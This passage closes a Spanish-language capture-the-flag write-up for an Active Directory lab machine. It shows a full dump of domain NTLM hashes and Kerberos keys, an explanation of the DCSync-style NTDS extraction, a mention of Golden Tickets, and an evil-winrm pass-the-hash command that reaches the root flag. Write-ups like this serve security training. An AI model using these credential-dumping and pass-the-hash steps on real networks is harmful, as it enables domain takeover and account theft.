Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6303be52e22950b5bcb764ff2b233302:::
ldap:1104:aad3b435b51404eeaad3b435b51404ee:b735f8c7172b49ca2b956b8015eb2ebe:::
support:1105:aad3b435b51404eeaad3b435b51404ee:11fbaef07d83e3f6cde9f0ff98a3af3d:::
smith.rosario:1106:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
hernandez.stanley:1107:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
wilson.shelby:1108:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
anderson.damian:1109:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
thomas.raphael:1110:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
levine.leopoldo:1111:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
raven.clifton:1112:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
bardot.mary:1113:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
cromwell.gerard:1114:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
monroe.david:1115:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
west.laura:1116:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
langley.lucy:1117:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
daughtler.mabel:1118:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
stoll.rachelle:1119:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
ford.victoria:1120:aad3b435b51404eeaad3b435b51404ee:0fab66daddc6ba42a3b0963123350706:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:f1480cd5c23e9016ae55e3390cde9a1e:::
SHUTDOWN$:6101:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f5301f54fad85ba357fb859c94c5c31a6abe61f6db1986c03574bfd6c2e31632
Administrator:aes128-cts-hmac-sha1-96:678dcbcbf92bc72fd318ac4aa06ede64
Administrator:des-cbc-md5:13a8c8abc12f945e
krbtgt:aes256-cts-hmac-sha1-96:21f4a7ed00009605ac5182a3d607d25447f48a3f13fbf60912f1e863a70d7141
krbtgt:aes128-cts-hmac-sha1-96:e963352bcdd503ddc3017a2afd620ccb
krbtgt:des-cbc-md5:70b3fdaefe454ad5
ldap:aes256-cts-hmac-sha1-96:f54423bd0d85939de61519c02fad691596f47c0a34cdf0983131bb962ee6ae7a
ldap:aes128-cts-hmac-sha1-96:0447dc15751883c29d9f450acc95db3d
ldap:des-cbc-md5:2ada4ccbcbceb901
support:aes256-cts-hmac-sha1-96:ada63670275687524019008a737c3b57cbf2d1be9eb08a60954a3dcb9268f4e4
support:aes128-cts-hmac-sha1-96:34a8a853cee33abe1668d7660a1affd9
support:des-cbc-md5:79fdc47f98ea70f2
smith.rosario:aes256-cts-hmac-sha1-96:4ce2d5be0ad97e2ff69e7103f3baee3ee58826dbf6061187f266859a294648b3
smith.rosario:aes128-cts-hmac-sha1-96:d181b8c4247a3fa19d7ad76d0026b264
smith.rosario:des-cbc-md5:495d086b52917c6e
hernandez.stanley:aes256-cts-hmac-sha1-96:665165633c8446cfc4264434307c336ddfd91372fda23dc318fb99369c6b78ec
hernandez.stanley:aes128-cts-hmac-sha1-96:8f62b1cba1910f730d905fe388acd69c
hernandez.stanley:des-cbc-md5:a24a340ec885046b
wilson.shelby:aes256-cts-hmac-sha1-96:3f72fd104691e5c59664834bba1d4b9ddbbfea30605cb2120fafa1ee8720b502
wilson.shelby:aes128-cts-hmac-sha1-96:1ea7512778994ec36b259d590df0a188
wilson.shelby:des-cbc-md5:622089cb10152fcd
anderson.damian:aes256-cts-hmac-sha1-96:cb56856b143d38b9191d16ab1e64f9460d06f29a406b37f3da9925a21d87d092
anderson.damian:aes128-cts-hmac-sha1-96:e18d3688bcacab591dabf00f080369f4
anderson.damian:des-cbc-md5:329ee6d3405834e5
thomas.raphael:aes256-cts-hmac-sha1-96:c1c5ec89304832e7bbbc3cc2a108671df6464bd5989e8156e84e540bcac12ac0
thomas.raphael:aes128-cts-hmac-sha1-96:e5212c20b62c46245fc7e3843b4db754
thomas.raphael:des-cbc-md5:8c2064c4e975e31c
levine.leopoldo:aes256-cts-hmac-sha1-96:f3f471fa904dafa639d562b713ca57d6668e8e58c4838490e1e038f70e86fabb
levine.leopoldo:aes128-cts-hmac-sha1-96:3b8c7b502154308728e6092a0c524190
levine.leopoldo:des-cbc-md5:0464734a207f5d04
raven.clifton:aes256-cts-hmac-sha1-96:5ead58d4439aa8e64ce828f628629b0798c192f9925908670779a212178bce70
raven.clifton:aes128-cts-hmac-sha1-96:a3862f3e0c9096d735eb9e075b46ed9e
raven.clifton:des-cbc-md5:b6252651b01ff452
bardot.mary:aes256-cts-hmac-sha1-96:54123fcaa07765a4d8136cf95cff67173d31d6c049f1d0936cb33c257aab20c5
bardot.mary:aes128-cts-hmac-sha1-96:a941571a50d40fa5771c8deffa44a501
bardot.mary:des-cbc-md5:bc79e0a8f7dfdc10
cromwell.gerard:aes256-cts-hmac-sha1-96:397983e21a3742e1d9c53bd51570a89dfdb9b79cfc15eb294500e16eee9c5a0c
cromwell.gerard:aes128-cts-hmac-sha1-96:a495521b2d0992a21d0cd6b968dbb042
cromwell.gerard:des-cbc-md5:0e2f37ae7c58310b
monroe.david:aes256-cts-hmac-sha1-96:13dd6e3f424e0e3b394964ceaf9f739c19a680c97648b1531b8e417012d9775d
monroe.david:aes128-cts-hmac-sha1-96:a15fd3bccfb2e7ead3bdf2fe4c47f355
monroe.david:des-cbc-md5:a86b5829047f2557
west.laura:aes256-cts-hmac-sha1-96:54a3167b1c9ee166874a6b09b08621394b049197270d4b754e8fedb78ee86b88
west.laura:aes128-cts-hmac-sha1-96:864381e434a5856d85c1f61bc8726378
west.laura:des-cbc-md5:8a923480ec7cd9d3
langley.lucy:aes256-cts-hmac-sha1-96:f2415b075b6e205864de19917a9989398672b062dad29d58af177d358e086998
langley.lucy:aes128-cts-hmac-sha1-96:20cdc3297fc8138726e34e45ba9f73d6
langley.lucy:des-cbc-md5:fd738a3dd0028fb0
daughtler.mabel:aes256-cts-hmac-sha1-96:7ce8f29915849ec300bd81341759d19c67e045501e1ee7e198fe37a7ee51af8d
daughtler.mabel:aes128-cts-hmac-sha1-96:791efedf5473d798dbc3267ce6d045aa
daughtler.mabel:des-cbc-md5:01ba80795bbc3ea8
stoll.rachelle:aes256-cts-hmac-sha1-96:d9cca58315e797cdb21ca8ad71278112357291a970a90084586a38d4c5ff38c2
stoll.rachelle:aes128-cts-hmac-sha1-96:c7768011ce94e18fae341bdfb5223bc3
stoll.rachelle:des-cbc-md5:b63d15683434b38f
ford.victoria:aes256-cts-hmac-sha1-96:de0a90f4f874ebb0937df96bc14308dcbb54835ac622ad16b79cf9509313f205
ford.victoria:aes128-cts-hmac-sha1-96:2241c9137590e4bde952ac411a1c22c6
ford.victoria:des-cbc-md5:13d573730ba8641f
DC$:aes256-cts-hmac-sha1-96:50be66e5e431c6aabc6906ac894e19c6e5b291955e4452b1994177e34bbeb6f8
DC$:aes128-cts-hmac-sha1-96:8c6b2c2c881412724a1304216c0410ea
DC$:des-cbc-md5:1f493ecd8943a15b
SHUTDOWN$:aes256-cts-hmac-sha1-96:dd7b250f8188466c057dddddffa133e3bdadd3b70b3aff27fdbd2d73e5b87386
SHUTDOWN$:aes128-cts-hmac-sha1-96:909e812eb9e7df02cd2c5b369961b197
SHUTDOWN$:des-cbc-md5:aed9914f0b43c4d0
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

Fijandonos en el orden de las secciones del output, el dump pasó por tres fases, y las tres se completaron exitosamente:
```
┌─────────────────────────────────────────────────────────────┐
│  1. SAM hashes (locales del DC)           > completado      │
│  2. LSA Secrets (incluye $MACHINE.ACC,                      │
│     DPAPI keys, NL$KM)                    > completado      │
│  3. NTDS.DIT vía DRSUAPI                  > completado      │
│     (esto es la base de datos COMPLETA                      │
│     de Active Directory, todos los                          │
│     usuarios del dominio, con hashes NTLM                   │
│     y claves Kerberos)                                      │
└─────────────────────────────────────────────────────────────┘
```
La fase 3 es la que mas importa, `DRSUAPI` es un metodo que significa que impacket uso los privilegios de replicacion del dominio (que el ticket impersonado como Administrador te da) para pedirle al DC que le replique su base de datos de usuarios completa, es exactamente lo mismo que un ataque DCSync.


Ahora tenemos el hash NTLM de todos los usuarios del dominio. Incluyendo el de `Administrator` (eso es dominio comprometido) y hasta el de `krbtgt`, con el hash de `krbtgt` hasta podriamos forjar Golden Tickets pero ya no lo necesitamos porque ya vulneramos el dominio.

Ya solo quedaria validarlo con **Pass-the-Hash** para tomar el shell final y agarrar la root flag
```
# evil-winrm -i $IP -u "Administrator" -H 'bb06cbc02b39abeddd1335bc30b19e26' 
                                        
Evil-WinRM shell v3.9
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> 
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---        10/19/2026  10:36 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
1ea995771892f75b9bcdf1f8da2c74d5
```
